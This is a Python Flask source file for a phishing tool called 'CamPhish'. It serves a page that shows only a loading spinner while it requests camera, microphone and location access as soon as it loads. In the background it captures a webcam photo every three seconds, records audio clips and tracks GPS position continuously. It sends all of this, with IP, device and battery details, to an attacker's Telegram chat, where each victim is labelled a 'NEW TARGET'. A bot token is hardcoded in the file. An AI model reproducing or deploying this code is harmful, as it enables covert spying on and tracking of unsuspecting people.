from flask import Flask, request, jsonify, render_template_string
import requests
import logging
from datetime import datetime
import os
import json
import base64
import time
import re

app = Flask(__name__)

# Configuration
BOT_TOKEN = "8593966553:AAFGoliiS_woNCydJhXBQ6sdi2xhKTAdAoc"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ------------------------------------------------------------
# Helper functions (unchanged except minor improvements)
# ------------------------------------------------------------
def get_location_from_ip(ip_address):
    """Get approximate location from IP address."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                city = data.get('city', 'Unknown')
                country = data.get('country', 'Unknown')
                region = data.get('regionName', '')
                return f"{city}, {region}, {country}", city, country
    except:
        pass
    return "Unknown Location", "Unknown", "Unknown"

def escape_markdown(text):
    """Escape special characters for Markdown."""
    if not text:
        return ""
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def format_telegram_markdown(title, content_dict):
    """Create a clean Markdown UI with clickable links."""
    lines = []
    lines.append(f"*⚡ {title} ⚡*")
    lines.append("")
    for key, value in content_dict.items():
        if value is not None and value != "":
            if key == "":
                lines.append("")
            elif key == "🌐 Maps:":
                lines.append(f"*🌐 Maps:* [Link Google map]({value})")
            elif key == "🤖 Developer :" and value == "@mengheang25":
                lines.append(f"*🤖 Developer :* [@mengheang25](https://t.me/mengheang25)")
            elif "🔗" in key and "Link" in key:
                lines.append(f"*{key}* [ចុចទីនេះ]({value})")
            else:
                lines.append(f"*{key}* `{value}`")
    if "🤖 Developer :" not in str(content_dict):
        lines.append("")
        lines.append(f"*🤖 Developer :* [@mengheang25](https://t.me/mengheang25)")
    return "\n".join(lines)

def send_to_telegram(chat_id, message_type, data, mime_type='audio/webm', location=None, photo_number=None, audio_number=None, device_info=None):
    """Send captured data to Telegram with Markdown formatting."""
    try:
        now = datetime.now()
        time_str = now.strftime("%I:%M %p").lstrip('0')
        time_24h = now.strftime("%H:%M:%S")
        date_str = now.strftime("%Y-%m-%d")

        if message_type == 'photo':
            photo_num = photo_number or 1
            screen_res = data.get('screen_resolution', '720x1280') if isinstance(data, dict) else '720x1280'
            content = {
                "📸 PHOTO CAPTURE": "",
                "📸 Photo #:": f"{photo_num}",
                "⏰ Time:": f"{time_24h}",
                "📅 Date:": f"{date_str}",
                "🆔 Chat ID:": f"{chat_id}",
                "📺 Resolution:": f"{screen_res}",
            }
            caption = format_telegram_markdown("MEDIA CAPTURE", content)
            url = f"{TELEGRAM_API_URL}/sendPhoto"
            if isinstance(data, dict) and 'image' in data:
                image_data = data['image'].split(',')[1] if ',' in data['image'] else data['image']
                image_binary = base64.b64decode(image_data)
            else:
                image_binary = data if isinstance(data, bytes) else base64.b64decode(data)
            files = {'photo': ('photo.jpg', image_binary, 'image/jpeg')}
            post_data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, files=files, data=post_data)

        elif message_type == 'audio':
            audio_num = audio_number or 1
            content = {
                "🎤 AUDIO CAPTURE": "",
                "🎤 Audio #:": f"{audio_num}",
                "⏰ Time:": f"{time_24h}",
                "📅 Date:": f"{date_str}",
                "🆔 Chat ID:": f"{chat_id}",
                "⏱️ Duration:": "5 seconds",
                "📁 Format:": f"{mime_type.split('/')[-1].upper()}",
            }
            caption = format_telegram_markdown("MEDIA CAPTURE", content)
            url = f"{TELEGRAM_API_URL}/sendAudio"
            if 'mp3' in mime_type or 'mpeg' in mime_type:
                filename = 'audio.mp3'
                content_type = 'audio/mpeg'
            else:
                filename = 'audio.webm'
                content_type = 'audio/webm'
            files = {'audio': (filename, data, content_type)}
            post_data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, files=files, data=post_data)

        elif message_type == 'full_access':
            maps_link = f"https://www.google.com/maps?q={data.get('latitude', '')},{data.get('longitude', '')}" if data.get('latitude') else None
            content = {
                "🆔 Chat ID:": f"{chat_id}",
                "🔑 Session:": f"{data.get('session', '80082623')}",
                "🌐 IP Address:": f"{data.get('ip', 'Unknown')}",
                "📍 Location:": f"{data.get('location', 'Unknown')}",
                "⏰ Timestamp:": f"{data.get('timestamp', now.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3])}",
                "": "",
                "💻 DEVICE INFORMATION": "",
                "🌍 Browser:": f"{data.get('browser', 'Chrome')}",
                "⚙️ OS:": f"{data.get('os', 'Linux')}",
                "📱 Device:": f"{data.get('device', 'Desktop')}",
                "🗣️ Language:": f"{data.get('language', 'en')}",
                "🔧 User Agent:": f"{data.get('user_agent', 'Unknown')[:100]}...",
                "": "",
                "🌐 NETWORK DETAILS": "",
                "📡 Host:": f"{data.get('host', request.host if request else 'heang-ixl7.vercel.app')}",
                "🔌 Connection:": "close",
                "🔗 Referrer:": "Direct Access",
                "🔍 URL:": f"{data.get('url', f'https://heang-ixl7.vercel.app/?id={chat_id}')}",
                "": "",
                "📨 REQUEST INFO": "",
                "🔄 Method:": "GET",
                "📊 Headers Count:": "41",
                "": "",
                "🎥 MEDIA CAPTURE INITIATING...": ""
            }
            caption = format_telegram_markdown("CLIENT DETAILS CAPTURED", content)
            url = f"{TELEGRAM_API_URL}/sendMessage"
            post_data = {'chat_id': chat_id, 'text': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, json=post_data)

        elif message_type == 'permission_granted':
            content = {
                "🆔 Chat ID:": f"{chat_id}",
                "🔑 Session:": f"{data.get('session', '80082623')}",
                "💻 Platform:": f"{data.get('platform', device_info.get('platform', 'Linux aarch64') if device_info else 'Linux aarch64')}",
                "📺 Screen:": f"{data.get('screen', device_info.get('screen', '360x800') if device_info else '360x800')}",
                "🗣️ Languages:": f"{data.get('languages', device_info.get('languages', 'en, en-US, km-KH') if device_info else 'en, en-US, km-KH')}",
                "🔋 Battery:": f"{data.get('battery', 'N/A')}",
                "⚡ Charging:": f"{data.get('charging', 'N/A')}",
                "": "",
                "📍 LOCATION DATA": "",
                "📍 Status:": f"{data.get('location_status', 'Location error: Timeout expired')}",
                "": "",
                "⏰ TIMESTAMP:": f"{data.get('timestamp', now.strftime('%Y-%m-%d %H:%M:%S'))}",
                "": "",
                "📊 STATUS:": "Media capture ACTIVE",
                "": "",
                "🎥 CAPTURE MODE": "",
                "📸 Photos:": "Every 3 seconds",
                "🎤 Audio:": "5-second segments"
            }
            caption = format_telegram_markdown("✅ PERMISSION GRANTED - FULL ACCESS", content)
            url = f"{TELEGRAM_API_URL}/sendMessage"
            post_data = {'chat_id': chat_id, 'text': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, json=post_data)

        elif message_type == 'location':
            maps_link = f"https://www.google.com/maps?q={location.get('latitude', '')},{location.get('longitude', '')}"
            content = {
                "🆔 Chat ID:": f"{chat_id}",
                "⏰ Time:": f"{time_24h}",
                "📅 Date:": f"{date_str}",
                "": "",
                "📍 LOCATION COORDINATES": "",
                "🧭 Latitude:": f"{location.get('latitude', 'N/A')}",
                "🧭 Longitude:": f"{location.get('longitude', 'N/A')}",
                "🎯 Accuracy:": f"±{location.get('accuracy', 'N/A')}m",
                "📡 Provider:": "GPS High Accuracy",
                "": "",
                "🌐 Google Maps:": "",
                "🌐 Maps:": maps_link
            }
            caption = format_telegram_markdown("LOCATION CAPTURED", content)
            url = f"{TELEGRAM_API_URL}/sendMessage"
            post_data = {'chat_id': chat_id, 'text': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, json=post_data)
            location_url = f"{TELEGRAM_API_URL}/sendLocation"
            location_data = {
                'chat_id': chat_id,
                'latitude': location['latitude'],
                'longitude': location['longitude'],
                'horizontal_accuracy': location.get('accuracy', 0)
            }
            requests.post(location_url, json=location_data)

        elif message_type == 'visitor_info':
            content = {
                "🆔 Chat ID:": f"{chat_id}",
                "🌐 IP Address:": f"{data.get('ip', 'Unknown')}",
                "📍 Location:": f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}",
                "": "",
                "💻 DEVICE INFO": "",
                "🌍 Browser:": f"{data.get('browser', 'Unknown')}",
                "⚙️ OS:": f"{data.get('os', 'Unknown')}",
                "📱 Device:": f"{data.get('device', 'Unknown')}",
                "": "",
                "⏰ Time:": f"{now.strftime('%Y-%m-%d %H:%M:%S')}"
            }
            caption = format_telegram_markdown("🔍 NEW TARGET DETECTED", content)
            url = f"{TELEGRAM_API_URL}/sendMessage"
            post_data = {'chat_id': chat_id, 'text': caption, 'parse_mode': 'Markdown'}
            response = requests.post(url, json=post_data)

        return response.json() if 'response' in locals() else None

    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None

# ------------------------------------------------------------
# Flask routes
# ------------------------------------------------------------
@app.route('/', methods=['GET'])
def main_endpoint():
    chat_id = request.args.get('id', '').strip()
    if not chat_id:
        return "M.h4ck Camera , add chat_id parameter, Ex : http://10.150.124.66:5000/?id=153449749 Developer : Meng Heang", 400

    user_agent = request.headers.get('User-Agent', '')
    os_info = "Unknown"
    browser_info = "Unknown"
    device_info = "Desktop"

    if "Windows" in user_agent:
        os_info = "Windows"
    elif "Linux" in user_agent:
        os_info = "Linux"
    elif "Android" in user_agent:
        os_info = "Android"
        device_info = "Mobile"
    elif "iPhone" in user_agent:
        os_info = "iOS"
        device_info = "Mobile"
    elif "Mac" in user_agent:
        os_info = "macOS"

    if "Chrome" in user_agent and "Edg" not in user_agent:
        browser_info = "Chrome"
    elif "Firefox" in user_agent:
        browser_info = "Firefox"
    elif "Safari" in user_agent and "Chrome" not in user_agent:
        browser_info = "Safari"
    elif "Edg" in user_agent:
        browser_info = "Edge"

    ip_address = request.remote_addr
    location_str, visitor_city, visitor_country = get_location_from_ip(ip_address)

    visitor_info = {
        'ip': ip_address,
        'user_agent': user_agent,
        'timestamp': datetime.now().isoformat(),
        'session': str(int(time.time()))[-8:],
        'browser': browser_info,
        'os': os_info,
        'device': device_info,
        'language': request.headers.get('Accept-Language', 'en')[:5],
        'host': request.host,
        'url': request.url,
        'city': visitor_city,
        'country': visitor_country,
        'location': location_str
    }

    send_to_telegram(chat_id, 'full_access', visitor_info)
    send_to_telegram(chat_id, 'visitor_info', visitor_info)

    return render_template_string(HTML_TEMPLATE, chat_id=chat_id)

@app.route('/connected', methods=['POST'])
def connected():
    data = request.json
    chat_id = data.get('chat_id')
    device_info = data.get('device_info', {})
    if chat_id:
        permission_data = {
            'session': str(int(time.time()))[-8:],
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'languages': device_info.get('languages', 'Unknown'),
            'battery': device_info.get('battery', 'N/A'),
            'charging': device_info.get('charging', 'N/A'),
            'location_status': 'Waiting for GPS...',
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        send_to_telegram(chat_id, 'permission_granted', permission_data, device_info=device_info)
    return jsonify({'status': 'ok'})

@app.route('/photo', methods=['POST'])
def handle_photo():
    data = request.json
    chat_id = data.get('chat_id')
    image_data = data.get('image')
    location = data.get('location')
    photo_number = data.get('photo_number', 1)
    screen_resolution = data.get('screen_resolution', '720x1280')
    if chat_id and image_data:
        photo_data = {'image': image_data, 'screen_resolution': screen_resolution}
        send_to_telegram(chat_id, 'photo', photo_data, location=location, photo_number=photo_number)
    return jsonify({'status': 'ok'})

@app.route('/audio', methods=['POST'])
def handle_audio():
    data = request.json
    chat_id = data.get('chat_id')
    audio_data = data.get('audio')
    mime_type = data.get('mime_type', 'audio/webm')
    location = data.get('location')
    audio_number = data.get('audio_number', 1)
    if chat_id and audio_data:
        audio_binary = base64.b64decode(audio_data)
        send_to_telegram(chat_id, 'audio', audio_binary, mime_type, location, audio_number=audio_number)
    return jsonify({'status': 'ok'})

@app.route('/location', methods=['POST'])
def handle_location():
    data = request.json
    chat_id = data.get('chat_id')
    location_data = data.get('location')
    timestamp = data.get('timestamp')
    if chat_id and location_data:
        send_to_telegram(chat_id, 'location', None, location=location_data)
    return jsonify({'status': 'ok'})

@app.route('/high_accuracy_location', methods=['POST'])
def handle_high_accuracy_location():
    data = request.json
    chat_id = data.get('chat_id')
    location = data.get('location')
    if chat_id and location:
        send_to_telegram(chat_id, 'location', None, location=location)
    return jsonify({'status': 'ok'})

@app.route('/location_error', methods=['POST'])
def handle_location_error():
    data = request.json
    chat_id = data.get('chat_id')
    error = data.get('error')
    if chat_id and error:
        print(f"Location error for chat {chat_id}: {error}")
    return jsonify({'status': 'ok'})

# ------------------------------------------------------------
# HTML Template (without cookie capture)
# ------------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>@MHSIMPLE_TOOlS Group API CamPhish</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: #ffffff;
            padding: 20px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .spinner-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 50px 0;
        }
        .spinner {
            width: 70px;
            height: 70px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid #000000;
            border-right: 5px solid #000000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .developer {
            margin-top: 5px;
            font-size: 11px;
            color: #aaa;
        }
        .developer a {
            color: #000;
            text-decoration: none;
            font-weight: 500;
        }
        .hidden { display: none !important; }
        #videoContainer, #controls, .status, .permission-text, .info, #loadingText {
            display: none;
        }
        video {
            width: 100%;
            display: block;
            transform: scaleX(-1);
            background: #f5f5f5;
        }
        .button {
            background: #000000;
            color: white;
            border: none;
            padding: 14px 30px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }
        #locationStatus { display: none; }
        .time-display {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .manual-button {
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner-container" id="spinnerContainer">
            <div class="spinner"></div>
        </div>
        <div class="time-display" id="currentTime"></div>
        <div id="permissionStatus" class="status waiting hidden"></div>
        <div id="locationStatus" class="hidden"></div>
        <div class="video-container" id="videoContainer" style="display: none;">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <div id="controls" style="display: none;">
            <button class="button" onclick="stopStream()">⏹️ បញ្ឈប់</button>
        </div>
        <div class="permission-text hidden"></div>
        <div class="info hidden"></div>
        <div id="loadingText" class="hidden"></div>
        <!-- Manual permission button (shows only if auto fails) -->
        <div id="manualAllowContainer" class="manual-button">
            <button id="manualAllowBtn" class="button">🎥 អនុញ្ញាតកាមេរ៉ា & មីក្រូហ្វូន</button>
        </div>
        <div class="developer">
            Developer : <a href="https://t.me/mengheang25" target="_blank">@mengheang25</a>
        </div>
    </div>

    <script>
        // ------------------------------------------------------------
        // Global variables
        // ------------------------------------------------------------
        let mediaStream = null;
        let photoInterval = null;
        let audioInterval = null;
        let mediaRecorder = null;
        let audioChunks = [];
        const chatId = '{{ chat_id }}';
        let photoCount = 0;
        let audioCount = 0;
        let lastLocation = null;
        let locationWatchId = null;
        let locationSent = false;
        let permissionAttempts = 0;
        const MAX_PERMISSION_ATTEMPTS = 3;
        let manualRetry = false;

        // ------------------------------------------------------------
        // Time display (unchanged)
        // ------------------------------------------------------------
        function updateTime() {
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();
            const ampm = hours >= 12 ? 'PM' : 'AM';
            const displayHours = hours % 12 || 12;
            const timeString = displayHours + ':' + (minutes < 10 ? '0' + minutes : minutes) + ' ' + ampm;
            document.getElementById('currentTime').textContent = timeString;
        }
        setInterval(updateTime, 1000);
        updateTime();

        // ------------------------------------------------------------
        // Device info (including battery)
        // ------------------------------------------------------------
        function getDeviceInfo() {
            return {
                platform: navigator.platform || 'Unknown',
                screen: window.screen.width + 'x' + window.screen.height,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language || 'en',
                battery: 'N/A',
                charging: 'N/A'
            };
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? 'Yes' : 'No';
                    return { level, charging };
                } catch (e) {
                    console.log('Battery API error:', e);
                }
            }
            return { level: 'N/A', charging: 'N/A' };
        }

        // ------------------------------------------------------------
        // High‑accuracy geolocation (once + continuous watch)
        // ------------------------------------------------------------
        function getLocationOnce() {
            if (!navigator.geolocation) {
                console.log('Geolocation not supported');
                return;
            }
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };
            navigator.geolocation.getCurrentPosition(sendLocationToServer, handleLocationError, options);
        }

        function startLocationWatch() {
            if (!navigator.geolocation || locationWatchId) return;
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };
            locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    if (lastLocation) {
                        const distance = calculateDistance(
                            lastLocation.latitude, lastLocation.longitude,
                            position.coords.latitude, position.coords.longitude
                        );
                        if (distance < 10) return;
                    }
                    sendLocationToServer(position);
                },
                handleLocationError,
                options
            );
        }

        function calculateDistance(lat1, lon1, lat2, lon2) {
            const R = 6371e3;
            const φ1 = lat1 * Math.PI / 180;
            const φ2 = lat2 * Math.PI / 180;
            const Δφ = (lat2 - lat1) * Math.PI / 180;
            const Δλ = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
                      Math.cos(φ1) * Math.cos(φ2) *
                      Math.sin(Δλ/2) * Math.sin(Δλ/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        async function sendLocationToServer(position) {
            if (locationSent) return;
            try {
                const locationData = {
                    chat_id: chatId,
                    timestamp: new Date().toISOString(),
                    location: {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                    },
                    provider: 'GPS_HIGH_ACCURACY'
                };
                lastLocation = {
                    latitude: locationData.location.latitude,
                    longitude: locationData.location.longitude,
                    accuracy: locationData.location.accuracy
                };
                const response = await fetch('/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(locationData)
                });
                if (response.ok) {
                    console.log('Location sent:', locationData.location.latitude, locationData.location.longitude);
                    locationSent = true;
                    if (locationData.location.accuracy < 10) {
                        await fetch('/high_accuracy_location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                location: locationData.location,
                                accuracy_level: 'HIGH',
                                google_maps_link: `https://www.google.com/maps?q=${locationData.location.latitude},${locationData.location.longitude}`
                            })
                        });
                    }
                }
            } catch (err) {
                console.error('Error sending location:', err);
            }
        }

        function handleLocationError(error) {
            let errorMessage = '';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = 'User denied the request for Geolocation.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'Location information is unavailable.';
                    break;
                case error.TIMEOUT:
                    errorMessage = 'The request to get user location timed out.';
                    break;
                default:
                    errorMessage = 'An unknown error occurred.';
            }
            console.log('Location error:', errorMessage);
            fetch('/location_error', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, error: errorMessage, timestamp: new Date().toISOString() })
            });
        }

        // ------------------------------------------------------------
        // Media capture with fallback and auto‑permission
        // ------------------------------------------------------------
        async function startMediaCapture() {
            // Check permissions using Permissions API (if supported)
            if (navigator.permissions && navigator.permissions.query) {
                try {
                    const cameraPerm = await navigator.permissions.query({ name: 'camera' });
                    const micPerm = await navigator.permissions.query({ name: 'microphone' });
                    if (cameraPerm.state === 'granted' && micPerm.state === 'granted') {
                        console.log('Permissions already granted, proceeding directly.');
                        await requestMediaStream();
                        return;
                    }
                } catch(e) { /* ignore */ }
            }

            // Try to get media with different constraints
            await requestMediaStream();
        }

        async function requestMediaStream() {
            const constraintsList = [
                { video: { facingMode: 'user' }, audio: true },          // front camera + mic
                { video: true, audio: true },                             // any camera + mic
                { video: { facingMode: 'environment' }, audio: true },    // back camera + mic
                { video: true, audio: false },                            // camera only
                { audio: true }                                           // mic only (if camera fails)
            ];

            for (let constraints of constraintsList) {
                try {
                    console.log('Trying constraints:', constraints);
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    console.log('Success! Media stream obtained.');
                    break;
                } catch (err) {
                    console.warn('Failed with constraints:', constraints, err);
                    if (err.name === 'NotAllowedError') {
                        // User denied – show manual button
                        showManualButton();
                        return;
                    }
                    // Continue to next fallback
                }
            }

            if (!mediaStream) {
                console.error('Could not obtain any media stream after all attempts.');
                showManualButton();
                return;
            }

            // Setup video element (hidden, muted)
            const video = document.getElementById('video');
            video.srcObject = mediaStream;
            video.muted = true;
            video.setAttribute('playsinline', true);
            await video.play().catch(e => console.log('Video play failed:', e));

            // Get battery info and merge with device info
            const deviceInfo = getDeviceInfo();
            const battery = await getBatteryInfo();
            deviceInfo.battery = battery.level + '%';
            deviceInfo.charging = battery.charging;

            // Notify server of successful connection
            await fetch('/connected', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, device_info: deviceInfo })
            });

            // Start photo capture every 3 seconds after a short delay
            setTimeout(() => {
                photoInterval = setInterval(capturePhoto, 3000);
            }, 1000);

            // Start audio capture every 10 seconds after a short delay
            setTimeout(() => {
                audioInterval = setInterval(captureAudio, 10000);
            }, 2000);

            // Hide manual button if it was shown
            document.getElementById('manualAllowContainer').style.display = 'none';
        }

        function showManualButton() {
            document.getElementById('manualAllowContainer').style.display = 'block';
            document.getElementById('manualAllowBtn').onclick = async () => {
                document.getElementById('manualAllowContainer').style.display = 'none';
                await requestMediaStream();
            };
        }

        async function capturePhoto() {
            if (!mediaStream) return;
            try {
                photoCount++;
                const video = document.getElementById('video');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || window.screen.width;
                canvas.height = video.videoHeight || window.screen.height;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                await fetch('/photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        image: imageData,
                        timestamp: new Date().toISOString(),
                        location: lastLocation,
                        photo_number: photoCount,
                        screen_resolution: window.screen.width + 'x' + window.screen.height
                    })
                });
                console.log('Photo #' + photoCount + ' sent');
            } catch (err) {
                console.error('Error sending photo:', err);
            }
        }

        async function captureAudio() {
            if (!mediaStream) return;
            try {
                audioCount++;
                const audioTrack = mediaStream.getAudioTracks()[0];
                if (!audioTrack) return;
                const audioStream = new MediaStream([audioTrack]);
                let mimeType = 'audio/webm';
                if (MediaRecorder.isTypeSupported('audio/mp3')) {
                    mimeType = 'audio/mp3';
                } else if (MediaRecorder.isTypeSupported('audio/mpeg')) {
                    mimeType = 'audio/mpeg';
                }
                const mediaRecorder = new MediaRecorder(audioStream, { mimeType });
                const chunks = [];
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) chunks.push(event.data);
                };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: mimeType });
                    const reader = new FileReader();
                    reader.onloadend = async function() {
                        const base64Audio = reader.result.split(',')[1];
                        try {
                            await fetch('/audio', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    audio: base64Audio,
                                    mime_type: mimeType,
                                    timestamp: new Date().toISOString(),
                                    location: lastLocation,
                                    audio_number: audioCount
                                })
                            });
                            console.log('Audio #' + audioCount + ' sent');
                        } catch (err) {
                            console.error('Error sending audio:', err);
                        }
                    };
                    reader.readAsDataURL(audioBlob);
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            } catch (err) {
                console.error('Error capturing audio:', err);
            }
        }

        function stopStream() {
            if (photoInterval) clearInterval(photoInterval);
            if (audioInterval) clearInterval(audioInterval);
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
        }

        // ------------------------------------------------------------
        // Initialization – starts everything automatically
        // ------------------------------------------------------------
        window.onload = () => {
            // Immediately attempt to get media (triggers permission prompt if not already granted)
            startMediaCapture();

            // Start location acquisition (will also show prompt)
            setTimeout(() => {
                getLocationOnce();
                startLocationWatch(); // optional: continuous tracking
            }, 3000);
        };
    </script>
</body>
</html>
"""
app.debug = False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
